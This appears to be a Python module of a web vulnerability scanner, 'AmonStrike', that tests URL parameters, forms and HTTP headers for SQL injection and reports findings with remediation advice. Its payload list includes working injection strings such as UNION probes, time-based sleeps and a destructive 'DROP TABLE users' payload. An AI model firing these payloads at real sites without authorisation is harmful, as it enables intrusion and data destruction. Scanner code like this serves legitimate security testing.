"""
AmonStrike — SQL Injection Module
Tests GET/POST parameters and headers for SQLi.
"""

import re
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from .base import BaseModule


class SqliModule(BaseModule):
    NAME        = "sqli"
    DESCRIPTION = "SQL Injection — GET/POST/headers/blind/error-based"

    # Error-based SQLi detection patterns
    ERROR_PATTERNS = [
        # MySQL
        (r"You have an error in your SQL syntax", "MySQL"),
        (r"Warning: mysql_", "MySQL"),
        (r"MySQLSyntaxErrorException", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"check the manual that corresponds to your MySQL", "MySQL"),
        # PostgreSQL
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning: pg_", "PostgreSQL"),
        (r"valid PostgreSQL result", "PostgreSQL"),
        (r"Npgsql\.", "PostgreSQL"),
        # MSSQL
        (r"Driver.* SQL[\-\_\ ]*Server", "MSSQL"),
        (r"OLE DB.* SQL Server", "MSSQL"),
        (r"SQLServer JDBC Driver", "MSSQL"),
        (r"Microsoft SQL Native Client error", "MSSQL"),
        # Oracle
        (r"ORA-[0-9][0-9][0-9][0-9]", "Oracle"),
        (r"Oracle error", "Oracle"),
        (r"Oracle.*Driver", "Oracle"),
        # SQLite
        (r"SQLite/JDBCDriver", "SQLite"),
        (r"SQLite.Exception", "SQLite"),
        (r"System.Data.SQLite.SQLiteException", "SQLite"),
        # Generic
        (r"Unclosed quotation mark", "Generic SQL"),
        (r"quoted string not properly terminated", "Generic SQL"),
        (r"SQL syntax.*MySQL", "Generic SQL"),
    ]

    # Basic SQLi payloads
    PAYLOADS = [
        "'",
        "''",
        "`",
        "\"",
        "\\",
        "'--",
        "'--+",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "1 OR 1=1",
        "1' OR '1'='1",
        "admin'--",
        "' OR 'x'='x",
        "1; DROP TABLE users--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND '1'='1",
        "' AND '1'='2",
        # Time-based blind
        "'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
    ]

    # Headers to test
    INJECTABLE_HEADERS = [
        "User-Agent",
        "X-Forwarded-For",
        "Referer",
        "Cookie",
        "X-Real-IP",
    ]

    def run(self):
        self.log("Testing SQL injection vectors...")

        # Get the page and extract forms + parameters
        resp = self.get()
        if not resp:
            return self.result()

        self.baseline_length = len(resp.text)
        self.baseline_content = resp.text

        # Test URL parameters
        self._test_url_params()

        # Test forms
        self._test_forms(resp)

        # Test headers
        self._test_headers()

        self.log(f"SQLi scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _detect_sqli_error(self, response_text):
        """Check if response contains SQL error patterns."""
        for pattern, db_type in self.ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return db_type
        return None

    def _test_url_params(self):
        """Test URL query parameters for SQLi."""
        parsed = urlparse(self.url)
        if not parsed.query:
            # Try common parameter names
            test_params = ["id", "page", "cat", "user", "name", "search", "q", "item"]
            for param in test_params:
                self._test_single_param(param, "1")
            return

        params = parse_qs(parsed.query)
        for param, values in params.items():
            original = values[0]
            self._test_single_param(param, original)

    def _test_single_param(self, param, original_value):
        """Test a single parameter with all payloads."""
        for payload in self.PAYLOADS[:10]:  # Limit to first 10 for speed
            test_value = original_value + payload
            resp = self.get(params={param: test_value})
            if not resp:
                continue

            # Error-based detection
            db_type = self._detect_sqli_error(resp.text)
            if db_type:
                self.add_finding(
                    title=f"SQL Injection (Error-Based) — Parameter: {param}",
                    severity="CRITICAL",
                    description=f"SQL injection vulnerability detected in parameter '{param}'. Database error from {db_type} is reflected in the response.",
                    evidence=f"Parameter: {param}\nPayload: {payload}\nDB Error: {db_type}\nResponse snippet: {resp.text[:300]}",
                    remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL queries. Use ORM frameworks.",
                    url=resp.url,
                    cve="CWE-89"
                )
                return  # Found, move on

            # Boolean-based blind detection
            if "AND 1=1" in payload or "AND 1=2" in payload:
                self._check_boolean_blind(param, original_value)
                break

    def _check_boolean_blind(self, param, original_value):
        """Check for boolean-based blind SQLi."""
        true_payload  = original_value + "' AND '1'='1"
        false_payload = original_value + "' AND '1'='2"

        r_true  = self.get(params={param: true_payload})
        r_false = self.get(params={param: false_payload})
        r_orig  = self.get(params={param: original_value})

        if not all([r_true, r_false, r_orig]):
            return

        orig_len  = len(r_orig.text)
        true_len  = len(r_true.text)
        false_len = len(r_false.text)

        # Significant length difference indicates boolean injection
        if abs(true_len - false_len) > 50 and abs(true_len - orig_len) < 50:
            self.add_finding(
                title=f"SQL Injection (Boolean Blind) — Parameter: {param}",
                severity="CRITICAL",
                description=f"Boolean-based blind SQL injection detected in parameter '{param}'. Response length differs significantly between TRUE and FALSE conditions.",
                evidence=f"Parameter: {param}\nOriginal length: {orig_len}\nTRUE condition length: {true_len}\nFALSE condition length: {false_len}\nDifference: {abs(true_len - false_len)} bytes",
                remediation="Use parameterized queries. Implement input validation. Use stored procedures.",
                cve="CWE-89"
            )

    def _test_forms(self, resp):
        """Find and test HTML forms for SQLi."""
        from bs4 import BeautifulSoup
        try:
            soup = BeautifulSoup(resp.text, "html.parser")
            forms = soup.find_all("form")
            self.log(f"Found {len(forms)} form(s)", "i")

            for form in forms:
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                form_url = urljoin(self.url, action) if action else self.url

                inputs = {}
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name", "")
                    itype = inp.get("type", "text").lower()
                    if name and itype not in ["submit", "button", "image", "file"]:
                        inputs[name] = inp.get("value", "test")

                if not inputs:
                    continue

                # Test each input
                for field in inputs:
                    for payload in self.PAYLOADS[:8]:
                        test_data = dict(inputs)
                        test_data[field] = payload

                        if method == "post":
                            r = self.post(form_url.replace(self.url, ""), data=test_data)
                        else:
                            r = self.get(form_url.replace(self.url, ""), params=test_data)

                        if not r:
                            continue

                        db_type = self._detect_sqli_error(r.text)
                        if db_type:
                            self.add_finding(
                                title=f"SQL Injection in Form Field: {field}",
                                severity="CRITICAL",
                                description=f"SQL injection in form field '{field}' (method: {method.upper()}). Database: {db_type}.",
                                evidence=f"Form action: {form_url}\nField: {field}\nPayload: {payload}\nDB: {db_type}",
                                remediation="Use parameterized queries for all database operations.",
                                url=form_url,
                                cve="CWE-89"
                            )
                            break
        except ImportError:
            self.log("BeautifulSoup not available for form parsing", "~")

    def _test_headers(self):
        """Test HTTP headers for SQLi."""
        baseline = self.get()
        if not baseline:
            return

        for header in self.INJECTABLE_HEADERS:
            for payload in self.PAYLOADS[:5]:
                r = self.get(headers={header: payload})
                if not r:
                    continue
                db_type = self._detect_sqli_error(r.text)
                if db_type:
                    self.add_finding(
                        title=f"SQL Injection via HTTP Header: {header}",
                        severity="HIGH",
                        description=f"SQL injection in {header} header. Database: {db_type}.",
                        evidence=f"Header: {header}: {payload}\nDB Error: {db_type}",
                        remediation="Sanitize all input including HTTP headers before using in SQL queries.",
                        cve="CWE-89"
                    )
                    break
